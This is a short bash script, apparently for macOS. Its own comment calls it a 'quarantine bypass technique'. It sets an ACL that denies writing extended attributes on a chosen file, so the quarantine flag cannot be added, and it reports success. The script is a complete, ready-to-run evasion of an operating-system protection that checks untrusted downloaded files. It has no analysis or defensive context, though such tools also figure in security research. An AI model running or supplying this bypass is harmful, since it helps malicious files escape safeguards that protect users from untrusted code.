#!/bin/bash
# Set ACL to prevent xattr modification (quarantine bypass technique)
# Usage: ./set-acl-bypass.sh <path-to-file>

if [ $# -lt 1 ]; then
    echo "Usage: $0 <path-to-file>"
    echo "Example: $0 /tmp/testfile"
    exit 1
fi

TARGET="$1"

# Check if target exists
if [ ! -e "$TARGET" ]; then
    echo "Error: Target does not exist: $TARGET"
    exit 1
fi

# Set ACL to prevent xattr modification
echo "Setting ACL on: $TARGET"
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" "$TARGET"

if [ $? -eq 0 ]; then
    echo "ACL set successfully."
    echo ""
    echo "Current ACLs:"
    ls -le "$TARGET"
    echo ""
    echo "This ACL prevents adding xattrs (including quarantine) to this file."
else
    echo "Failed to set ACL."
    exit 1
fi
